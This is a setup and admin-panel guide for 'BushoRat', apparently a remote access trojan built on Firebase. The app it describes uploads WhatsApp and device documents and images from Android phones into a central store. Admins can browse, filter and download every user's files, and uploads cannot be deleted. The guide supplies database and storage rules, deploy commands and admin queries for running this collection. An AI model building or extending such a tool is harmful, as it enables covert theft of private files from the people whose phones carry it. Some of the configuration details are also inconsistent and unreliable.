# BushoRat - Firebase Setup & Admin Panel Guide

## Database Structure

### Single Library Node (ONLY structure)
```
library/
  {userId}/
    {deviceId}/
      files/
        {fileId}:
          fileId: "..."
          name: "document.pdf"
          category: "PDF" | "OFFICE" | "TEXT" | "IMAGE"
          mimeType: "application/pdf"
          sizeBytes: 1024000
          storagePath: "library/{userId}/{deviceId}/file.pdf"
          downloadUrl: "https://..."
          uploadedAt: 1696420000000
          source: "whatsapp" | "device"
          device: "Pixel 6"
```

### Cloud Storage Structure
```
gs://bucket/library/
  {userId}/
    {deviceId}/
      file1.pdf
      file2.jpg
      document.xlsx
      ...
```

### Admin Access Control
```
admins/
  {adminUid}: true
  {anotherAdminUid}: true
```

## Setup Instructions

### 1. Enable Anonymous Authentication
- Go to Firebase Console → Authentication → Sign-in method
- Enable "Anonymous"
- Click "Enable create (sign-up)"

### 2. Deploy Realtime Database Rules
```bash
# Install Firebase CLI
npm install -g firebase-tools

# Login
firebase login

# Deploy rules from firebase-rules.json
firebase deploy --only database:rules
```

Or paste the rules directly in Firebase Console:
- Realtime Database → Rules tab → Copy paste from `firebase-rules.json`

### 3. Set Admin Users
In Firebase Realtime Database, create `/admins/{uid}` = true for each admin:
```json
{
  "admins": {
    "uid_of_admin_1": true,
    "uid_of_admin_2": true
  }
}
```

To find a user's UID:
1. Run the app on a device/emulator
2. Open Firebase Console → Realtime Database
3. Look at `/users` - you'll see UIDs of authenticated users
4. Add them to `/admins/{uid}`

### 4. Enable Storage

**Storage Rules** (`gs://your-project.appspot.com`):
```
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /library/{userId}/{deviceId}/{allPaths=**} {
      allow read: if request.auth.uid == userId || isAdmin(request.auth.uid);
      allow write: if request.auth.uid == userId;
    }
    
    function isAdmin(uid) {
      return get(/databases/$(database)/documents/admins/$(uid)).data == true;
    }
  }
}
```

## File Upload Priority

Files are uploaded in this order:

1. **WhatsApp Documents** - PDF, Office, Text
2. **Device Documents** - PDF, Office, Text  
3. **WhatsApp Images** - JPG, PNG, HEIC, etc.
4. **Device Images** - JPG, PNG, HEIC, etc.

Within each category, newer files upload first.

## Admin Panel Queries

### View all files from a specific user and device:
```
/library/{userId}/{deviceId}/files
```

### View all users with media:
```
/library
```

### Filter by category (e.g., all PDFs from a user):
```javascript
const filesRef = ref(db, 'library/{userId}/{deviceId}/files');
const q = query(filesRef, where('category', '==', 'PDF'));
```

### Filter by source (WhatsApp vs device):
```javascript
const q = query(filesRef, where('source', '==', 'whatsapp'));
```

### Download a file:
```javascript
const file = await get(ref(db, 'library/{userId}/{deviceId}/files/{fileId}'));
const downloadUrl = file.val().downloadUrl;  // Already stored in database
// Open in browser or download
```

## Security Notes

- ✅ Users can only upload their own files (auth.uid === $uid)
- ✅ Users can only read their own files and device list
- ✅ Admins can view all files (defined in /admins/{uid})
- ✅ Files > 100MB are rejected during upload
- ✅ Duplicate files are skipped (fingerprint: size+modified+path+name)
- ✅ Zip and other archive files excluded
- ✅ File uploads are permanent (no delete endpoints)

## Monitoring

### Check upload logs:
- Firebase Console → Realtime Database → Data tab
- Look for `/library/{userId}/{deviceId}/files`
- Each file shows: name, category, source, device, uploadedAt, downloadUrl

### Check storage usage:
- Firebase Console → Storage → Browse files
- Files organized by `library/{userId}/{deviceId}/`

### View sync activity:
- Android device: `adb logcat | grep SyncService`
- Search for: "✅ Uploaded", "❌ Failed", "Discovered X files"

## Troubleshooting

### "Enable Anonymous Auth in Firebase Console"
- Go to Firebase Console → Authentication → Sign-in method → Enable Anonymous

### App not uploading files
1. Check `adb logcat SyncService:D`
2. Verify permissions were granted (check device settings)
3. Check Firebase Realtime Database rules are deployed
4. Check Firebase Storage is enabled

### "Cannot read files" in admin panel
- Make sure your admin UID is in `/admins/{uid}`
- Check Storage rules allow your UID to read

### Storage quota exceeded
- Firebase Free tier: 1GB total + 1GB/month downloads
- Upgrade to Blaze plan or delete old files from Storage console
